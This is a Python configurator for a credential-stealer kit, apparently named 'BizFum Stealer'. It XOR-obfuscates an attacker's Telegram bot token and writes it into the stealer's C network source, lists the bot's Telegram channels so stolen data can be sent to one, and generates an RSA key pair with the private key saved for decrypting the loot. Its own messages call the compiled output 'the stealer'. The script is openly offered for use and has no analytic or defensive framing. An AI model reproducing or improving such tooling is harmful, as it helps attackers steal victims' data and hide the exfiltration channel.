import time
from colorama import Fore, Style
import subprocess
import requests
import json
import sys
import os

OS = sys.platform


### Functions for output.
def cls():
    os.system("cls" if OS.startswith("win") else "clear") 

def OKAY(message):
    print(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "*" + Fore.WHITE + "]  " + message)

def INFO(message):
    print(Style.BRIGHT + Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "]  " + message)

def ERROR(message):
    print(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]  " + message)

def QUESTION(message, valid_responses=None, lower=True):
    while True:
        if lower == False:
            answer = input(Style.BRIGHT + Fore.WHITE + "[" + Fore.CYAN + "?" + Fore.WHITE + "]  " + message).strip()
        else:
            answer = input(Style.BRIGHT + Fore.WHITE + "[" + Fore.CYAN + "?" + Fore.WHITE + "]  " + message).strip().lower()
        if valid_responses:
            if answer in valid_responses:
                return answer
            else:
                ERROR("Invalid input. Please enter one of the following: " + ", ".join(valid_responses))
        else:
            return answer

def LOGO():
    print(Fore.CYAN + """                                                                                                              
@@@@@@@   @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@@@       @@@@@@   @@@@@@@@  @@@@@@@  @@@  @@@  @@@@@@@   
@@@@@@@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@@@@     @@@@@@@   @@@@@@@@  @@@@@@@  @@@  @@@  @@@@@@@@  
@@!  @@@  @@!       @@!  @@!       @@!  @@@  @@! @@! @@!     !@@       @@!         @@!    @@!  @@@  @@!  @@@  
!@   @!@  !@!      !@!   !@!       !@!  @!@  !@! !@! !@!     !@!       !@!         !@!    !@!  @!@  !@!  @!@  
@!@!@!@   !!@     @!!    @!!!:!    @!@  !@!  @!! !!@ @!@     !!@@!!    @!!!:!      @!!    @!@  !@!  @!@@!@!   
!!!@!!!!  !!!    !!!     !!!!!:    !@!  !!!  !@!   ! !@!      !!@!!!   !!!!!:      !!!    !@!  !!!  !!@!!!    
!!:  !!!  !!:   !!:      !!:       !!:  !!!  !!:     !!:          !:!  !!:         !!:    !!:  !!!  !!:       
:!:  !:!  :!:  :!:       :!:       :!:  !:!  :!:     :!:         !:!   :!:         :!:    :!:  !:!  :!:       
 :: ::::   ::   :: ::::   ::       ::::: ::  :::     ::      :::: ::    :: ::::     ::    ::::: ::   ::       
:: : ::   :    : :: : :   :         : :  :    :      :       :: : :    : :: ::      :      : :  :    :

""")
    









### Replace a substring in a file
def ReplaceInFile(file, searchExp, replaceExp):
    # Get contents, then save the contents with the old key replaced
    with open(file, "r") as f:
        data = f.read()
        j = data.find(searchExp)
        if j == -1:
            ERROR(f"Couldn't find:\n{searchExp}\nin\n{data}")
        else:
            new_data = data.replace(str(searchExp), str(replaceExp).replace("\n", "", 1))

    # Write the new file data back to the file, preserving the original formatting
    with open(file, "w") as w:
        w.write(new_data)


### Find x:th occurence of a substring in a string. Needed when generating custom keys.
def find_nth(string, substring, n):
   if (n == 1):
       return string.find(substring)
   else:
       return string.find(substring, find_nth(string, substring, n - 1) + 1)

### Check if a tool exists.
def ProgramCheck(name):
    from shutil import which
    return which(name) is not None

### Run command and catch output.
def Run(command):
    parts = command.split(" ")
    result = subprocess.run(parts, stdout=subprocess.PIPE).stdout.decode('utf-8')
    return result









### File operations, such as editing variables inside of files.
def ChangeTGToken(FileWhereToReplace, Token):
    # Compile the BizFum encoder.
    EncoderPath = ".\\extra\\" if OS.startswith("win") else "./extra/"
    OutName = "TokenEncoder.exe" if OS.startswith("win") else "TokenEncoder"
    INFO(f"Compiling {EncoderPath}TokenEncoder.c")
    result = Run(f"gcc {EncoderPath}TokenEncoder.c -o {EncoderPath}{OutName}")
    if len(result) != 0 or not os.path.isfile(f"{EncoderPath}{OutName}"):
        ERROR("Either an error occured during compiling, or there is no output file! Try manually compiling and report issues (if any)...")
        exit(1)
    OKAY(f"Compiled {OutName} successfully.")
    EncodedToken = Run(f"{EncoderPath}{OutName} {Token}")
    for fnme in FileWhereToReplace:
        with open(fnme, "r") as f:
            data = f.readlines()
            for l in range(len(data)):
                if "char EncodedToken[]" in data[l]:
                    data[l] = f"char EncodedToken[] = \"{EncodedToken}\";\n"
            INFO(f"Replacing old encoded {Fore.RED}TOKEN{Fore.WHITE} with {Fore.GREEN}{EncodedToken}{Fore.WHITE} .")
        with open(fnme, "w") as ff:
            ff.writelines(data)

    os.remove(f"{EncoderPath}{OutName}")

    # Get channels for the BOT.
    r = json.loads(requests.get(f"https://api.telegram.org/bot{Token}/getUpdates").content.strip())
    channel_info = []
    for result in r["result"]:
        if 'message' in result and 'chat' in result['message']:
            chat = result['message']['chat']
        if chat.get('type') == 'channel':
            channel_info.append(f"{chat['id']}:{chat.get('title', 'Unknown Title')}")
        if 'my_chat_member' in result and 'chat' in result['my_chat_member']:
            chat = result['my_chat_member']['chat']
            if chat.get('type') == 'channel':
                channel_info.append(f"{chat['id']}:{chat.get('title', 'Unknown Title')}")

    # Ask the user which channel to use for the link sending.
    if len(channel_info) == 0:
        ERROR("Go add your bot into some servers! We didn't find any servers that your bot would be in.")
        exit(1)

    INFO("Below is a listing of available channels:\n")
    possibilities = []
    for i in range(len(channel_info)):
        possibilities.append(f"{str(i + 1)}")
        CHANNEL_ID = channel_info[i].split(":")[0]
        CHANNEL_NAME = channel_info[i].split(":")[1]
        print(f"{Fore.CYAN}{str(i + 1)}. {Fore.MAGENTA}{CHANNEL_NAME}                                                 -> ID:  {CHANNEL_ID}")
    print("")
    CHANNEL = channel_info[int(QUESTION("Choose channel with an integer: ", possibilities)) - 1].split(":")[0]
    for fnme in FileWhereToReplace:
        with open(fnme, "r") as f:
            data = f.readlines()
            for l in range(len(data)):
                if "char Channel_ID[]" in data[l]:
                    data[l] = f"    char Channel_ID[] = \"{CHANNEL}\";\n"
                    old_channel = data[l][data[l].find("\"") + 1 : -3]
                    INFO(f"Changing channel ID {Fore.LIGHTRED_EX}{old_channel}{Fore.WHITE} to: {Fore.LIGHTGREEN_EX}{CHANNEL}{Fore.WHITE}.")
        with open(fnme, "w") as ff:
            ff.writelines(data)




def CustomizeXORkey(FileWhereToReplace):
    # Get new key from user.
    new_key = "const char *STATIC_KEY = \"" + QUESTION("Input your desired new static key: ") + "\";"

    # Read the old key so we can properly replace it.
    for fnme in FileWhereToReplace:
        with open(fnme, "r") as f:
            data = f.readlines()
            for l in range(len(data)):
                if "const char *STATIC_KEY" in data[l]:
                    data[l] = new_key + "\n"
            print(f"Replacing old key with {new_key}")
        with open(fnme, "w") as ff:
            ff.writelines(data)
    OKAY("Replaced the old key with your custom key. Now next time you run the config, you can just answer with a \"no\" to this question!")

def GenerateCustomRSAKey(FileWhereToReplace):
    # Compile the generator.
    GeneratorPath = ".\\extra\\" if OS.startswith("win") else "./extra/"
    OutName = "KeyPairGenerator.exe" if OS.startswith("win") else "KeyPairGenerator"
    INFO(f"Compiling {GeneratorPath}KeyPairGenerator.c")
    
    result = Run(f"gcc {GeneratorPath}KeyPairGenerator.c -lbcrypt -o {GeneratorPath}{OutName}")
    if len(result) != 0 or not os.path.isfile(f"{GeneratorPath}{OutName}"):
        ERROR("Either an error occured during compiling, or there is no output file! Try re-running using default key...")
        exit(1)
    OKAY(f"Compiled {OutName} successfully.")
    
    # Run the tool.
    INFO("Generating a new key...")
    output = Run(f"{GeneratorPath}{OutName}")
    PublicKeyStart  = find_nth(output, "unsigned char PublicKey", 1)
    PublicKeyEnd    = find_nth(output, "};", 1) + 2
    PublicKey       = output[PublicKeyStart : PublicKeyEnd]
    PrivateKeyStart = find_nth(output, ":", 2) + 3
    PrivateKeyEnd   = find_nth(output, "END", 1)
    PrivateKey = output[PrivateKeyStart : PrivateKeyEnd]

    INFO(f"New key: \n{PublicKey}")

    # Read the old key so we can properly replace it.
    for fnme in FileWhereToReplace:
        with open(fnme, "r") as f:
            data = f.read()
            KeyStart = find_nth(data, "unsigned char PublicKey[] = ", 1)
            KeyEnd   = find_nth(data, "};", 1) + 2
            old_key = data[KeyStart:KeyEnd]
        
        ReplaceInFile(fnme, old_key, PublicKey)

    # Write the private key into a private.txt file.
    OutPath = ".\\Decrypting\\private.txt" if OS.startswith("win") else "./Decrypting/private.txt"
    with open(OutPath, "w") as privout:
        privout.write(str(PrivateKey).replace("\n", ""))
    OKAY("Replaced the old key with a freshly generated one and saved the private key to private.txt file. Now next time you run the config, you can just answer with a \"no\" to this question!")

    # Remove the file to avoid creating space taking stuff.
    os.remove(f"{GeneratorPath}{OutName}")



### Main function.
def main():
    # Clear screen
    cls()

    # Print logo
    LOGO()

    # Chck that needed tools are installed.
    INFO("Chcking if needed tools are installed...")
    if not ProgramCheck("gcc"):
        ERROR("A GCC compiler is necessary to compile the stealer. Please install it and rerun the program...")
        exit(1)
    else:
        OKAY("GCC compiler was found...")


    filescrypto = [".\\src\\verbose\\crypto.c", ".\\extra\\TokenEncoder.c"] if OS.startswith("win") else ["./src/verbose/crypto.c", "./extra/TokenEncoder.c"] # This will also include the ones in the normal version later.
    # Ask if the user wants to use the default RSA key provided or their own.
    print("\n")
    if QUESTION("Do you want to generate a custom RSA key for encryption? (yes/no): ", valid_responses=["yes", "no"]) == "yes":
        GenerateCustomRSAKey(filescrypto)
    else:
        OKAY("Using default RSA key...")
        


    # Ask if the user wants to set a custom static key for the XOR encryption(more like encoding) on the Telegram TOKEN.
    print("\n")
    if QUESTION(f"Do you want to use {Fore.GREEN}a custom{Fore.WHITE} static key for the XOR encryption done on the Telegram bot Token? (yes/no): ", valid_responses=["yes", "no"]) == "yes":
        CustomizeXORkey(filescrypto)
    else:
        OKAY("Using default static XOR key...")

    # Ask the user for the Telegram Bot token, then encode it.
    filenetwork = [".\\src\\verbose\\network.c"] if OS.startswith("win") else ["./src/verbose/network.c"]
    print("\n")
    while True:
        token = QUESTION(f"Telegram bot {Fore.RED}TOKEN{Fore.WHITE} to be encoded: ", None, False)
        if len(token) > 43 and len(token) < 49:
            break
        else:
            ERROR("Invalid token. (detected by size)...")
    ChangeTGToken(filenetwork, token)

    # Quit
    time.sleep(5)
    cls()
    LOGO()
    print("")
    OKAY("Setup should be done, the setup will get more advanced in further updates.")
    OKAY("You should now be just able to run the .\\built.bat file and compile with your customization. Press enter to close setup...")
    input("")



if __name__ == '__main__':
    main()